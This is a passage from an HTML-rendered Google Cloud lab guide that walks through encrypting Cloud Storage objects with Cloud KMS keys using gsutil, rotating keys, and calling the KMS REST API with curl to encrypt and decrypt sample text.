class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil kms encryption gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The default encryption key for the bucket should now be your first encryption key.</span></p><p><strong><span>Note:</span></strong><span> Objects that were written to a bucket prior to adding or changing the default key remain encrypted with the previous encryption method.</span></p><ol start='' ><li><p><span>Run the following command to copy </span><strong><span>file2.txt</span></strong><span> to the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp file2.txt gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h5 id='view-the-files-in-the-bucket'><span>View the files in the bucket</span></h5><ul><li><p><span>In the Cloud Console, go to </span><strong><span>Navigation menu &gt; Cloud Storage &gt; Bucket</span></strong><span> and click on your bucket for this lab.</span></p></li></ul><p><span>You will see </span><strong><span>file 1</span></strong><span> was encrypted with a Google-managed key and </span><strong><span>file 2</span></strong><span> was encrypted with a customer-managed key.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Add a default key for the bucket</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-4-encrypt-individual-objects-with-a-cloud-kms-key'><span>Task 4. Encrypt individual objects with a Cloud KMS key</span></h4><p><span>In this task, you encrypt an individual object with a Cloud KMS key. This is useful if you want to use a different key from the default key set on the bucket, or if you don&#39;t have a default key set on the bucket. This can be done by passing the key to use in each gsutil command by using the </span><code>-o</code><span> flag: </span><code>-o &quot;GSUtil:encryption_key=[KEY_RESOURCE]&quot;</code></p><ol start='' ><li><p><span>Run the following command to copy </span><strong><span>file3.txt</span></strong><span> to the bucket, encrypting it with your second encryption key:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil -o \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"GSUtil:encryption_key=projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_2_NAME" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cp file3.txt gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the Cloud Console, refresh the </span><strong><span>Bucket details</span></strong><span> screen and you will see </span><strong><span>file3.txt</span></strong><span> is also encrypted with a customer-managed key.</span></p></li></ol><h5 id='identify-the-key-used-to-encrypt-an-object'><span>Identify the key used to encrypt an object</span></h5><p><span>In the Cloud Console, look at the encryption column. It shows you what kind of key is used: a Google-managed key or a customer-managed key. If you hover over the key, you can get details about the key. You can also get key details using gsutil, which you will do in the next step.</span></p><ol start='' ><li><p><span>Run the following command to display details about an object (the </span><strong><span>-L</span></strong><span> option causes </span><strong><span>gsutil ls</span></strong><span> to display all file details):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil ls -L gs://$DEVSHELL_PROJECT_ID-kms/file3.txt</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>In the information returned, locate the KMS key line.</span></p></li></ol><p><span>This displays the encryption key being used by that file.</span></p><ol start='' ><li><p><span>Run the previous command again for </span><strong><span>file1.txt</span></strong><span> and </span><strong><span>file2.txt</span></strong><span>.</span></p></li></ol><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Encrypt individual objects with a Cloud KMS key</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-5-perform-key-rotation'><span>Task 5. Perform key rotation</span></h4><p><span>In this task, you perform automatic and manual key rotation.</span></p><p><strong><span>Note:</span></strong><span> In Cloud KMS, a key rotation is triggered by generating a new version of a key, and marking that version as the primary version. Each key has a designated primary version at any point in time, which Cloud KMS uses to encrypt data. After rotating a key, its previous key versions (which no longer are primary) are neither disabled or destroyed, and remain available for decrypting data.</span></p><h5 id='automatically-rotate-keys'><span>Automatically rotate keys</span></h5><p><strong><span>Note:</span></strong><span> By providing a rotation schedule, Cloud KMS will automatically rotate your keys for you. A key&#39;s rotation schedule can be set using the gcloud command-line tool or via the Cloud Console.</span></p><ol start='' ><li><p><span>In the Cloud Console, go to </span><strong><span>Navigation menu &gt; Security &gt; Key Management</span></strong><span> and click on the KeyRing named </span><strong><span>lab-keyring</span></strong><span> to view your encryption keys named </span><strong><span>labkey-1</span></strong><span> and </span><strong><span>labkey-2</span></strong><span>.</span></p></li><li><p><span>Click on the key named </span><strong><span>labkey-1</span></strong><span> to view all versions.</span></p></li></ol><p><span>Currently you only have one version.</span></p><ol start='' ><li><p><span>Click the </span><strong><span>EDIT ROTATION PERIOD</span></strong><span> button.</span></p></li><li><p><span>Set the </span><strong><span>rotation period</span></strong><span> dropdown to </span><strong><span>30 days</span></strong><span>.</span></p></li></ol><p><span>Notice that the rotation period can also be set to a Custom period that allows you to specify any desired period.</span></p><ol start='' ><li><p><span>Click </span><strong><span>SAVE</span></strong><span>.</span></p></li></ol><p><span>The Cloud Console now displays the next rotation date for this key.</span></p><h5 id='manually-rotate-keys'><span>Manually rotate keys</span></h5><p><strong><span>Note:</span></strong><span> Manually rotating keys can also be done with the gcloud command-line tool or via the Cloud Console.</span></p><ol start='' ><li><p><span>In the Cloud Console, go back to the KeyRing named </span><strong><span>lab-keyring</span></strong><span> and click on the key named </span><strong><span>labkey-2</span></strong><span> to view all versions.</span></p></li><li><p><span>Click the </span><strong><span>Rotate Key</span></strong><span> button and then click </span><strong><span>Rotate</span></strong><span>.</span></p></li></ol><p><span>You now have two versions of this key, </span><code>version 2</code><span> is the primary one.</span></p><p><strong><span>Note:</span></strong><span> Using the key rotation commands above, key rotation does NOT re-encrypt already encrypted data with the newly generated key version. If you suspect unauthorized use of a key, you should re-encrypt the data protected by that key and then disable or schedule destruction of the prior key version.</span></p><h5 id='destroy-old-keys'><span>Destroy old keys</span></h5><p><strong><span>Note:</span></strong><span> If you destroy a key that encrypts existing objects, you will be unable to recover that data, but you will continue to be charged for storage of your objects until you delete them.</span></p><p><span>In this part, you will not actually destroy a key, but you will investigate the process for doing so.</span></p><ol start='' ><li><p><span>From the </span><strong><span>labkey-2</span></strong><span> versions screen, click the three vertical dots on the far right of the line for </span><code>version 1</code><span> of the key and select </span><strong><span>Destroy</span></strong><span>.</span></p></li><li><p><span>Read the message in the </span><strong><span>Schedule key version 1 for destruction</span></strong><span> and click </span><strong><span>Cancel</span></strong><span> when done.</span></p></li></ol><p><span>You have successfully used Cloud KMS keys to encrypt data in Cloud Storage.</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Key Rotation</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='bonus-task-encrypt-data-with-the-rest-api'><span>Bonus task. Encrypt data with the REST API</span></h4><p><span>The Cloud KMS service also provides a REST API to perform encryption and decryption. The content to be encrypted is specified as part of a JSON document in the REST request, and this content must be encoded using Base64 encoding. This JSON document has the following form:</span></p><p><code>{&quot;plaintext&quot;:&quot;Base64 encoded data to encrypt&quot;}</code><span>.</span></p><p><span>In this bonus section to the lab, you will manually invoke the REST api using curl commands to demonstrate the capability of the API.</span></p><ol start='' ><li><p><span>This section assumes you still have the Cloud Shell session open and the following environment variables are defined:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">KEYRING_NAME</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">CRYPTOKEY_1_NAME</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><code>CRYPTOKEY_2_NAME</code><span>.</span></p><p><span>If these variables are no longer defined, go back to earlier in the lab and run the commands to create these variables.</span></p><ol start='' ><li><p><span>Run the following command to encode some sample text as base64 and store it in a variable named </span><strong><span>PLAIN_TEXT</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PLAIN_TEXT=$(echo -n "Some text to be encrypted" | base64)</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Echo the PLAIN_TEXT variable to verify the text was encoded:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo $PLAIN_TEXT</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You should see the base64-encoded text.</span></p><ol start='' ><li><p><span>Use the REST API to encrypt the encoded text by calling the </span><code>encrypt</code><span> method of your key.</span></p></li><li><p><span>Supply the base64-encoded content in the plaintext field of the JSON for your request:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"https://cloudkms.googleapis.com/v1/projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_1_NAME:encrypt" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-d "{\"plaintext\":\"$PLAIN_TEXT\"}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-H "Authorization:Bearer $(gcloud auth application-default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print-access-token)" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-H "Content-Type: application/json"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The response will be a JSON payload containing the encrypted text in the ciphertext field.</span></p><p><strong><span>Note:</span></strong><span> The encrypted text can easily be extracted from the JSON response, and saved to a file by using the command-line utility </span><strong><span>jq</span></strong><span>. The response from the previous call can be piped into </span><strong><span>jq</span></strong><span>, which can parse out the </span><strong><span>ciphertext</span></strong><span> property and save to </span><strong><span>data1.encrypted</span></strong><span>.</span></p><ol start='' ><li><p><span>Run the following command that repeats the encryption, but this time parses out the </span><strong><span>ciphertext</span></strong><span> property and saves it to the </span><strong><span>data1.encrypted</span></strong><span> file:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"https://cloudkms.googleapis.com/v1/projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_1_NAME:encrypt" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-d "{\"plaintext\":\"$PLAIN_TEXT\"}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-H "Authorization:Bearer $(gcloud auth application-default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print-access-token)" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-H "Content-Type: application/json" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| jq .ciphertext -r &gt; data1.encrypted</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the contents of the </span><strong><span>data1.encrypted</span></strong><span> file with the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">more data1.encrypted</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> The encrypted text can be decrypted by calling the decrypt method of your key. You must use the same key that was used to encrypt the content.</span></p><ol start='' ><li><p><span>Run the following command to decrypt the contents in the </span><strong><span>data1.encrypted</span></strong><span> file and save it into the file named </span><strong><span>data1.decrypted</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">curl -v \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">"https://cloudkms.googleapis.com/v1/projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_1_NAME:decrypt" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-d "{\"ciphertext\":\"$(cat data1.encrypted)\"}" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-H "Authorization:Bearer $(gcloud auth application-default \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">print-access-token)" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-H "Content-Type:application/json" \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| jq .plaintext -r | base64 -d &gt; data1.decrypted</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>View the contents of the </span><strong><span>data1.decrypted</span></strong><span> file with the following command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">more data1.decrypted</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 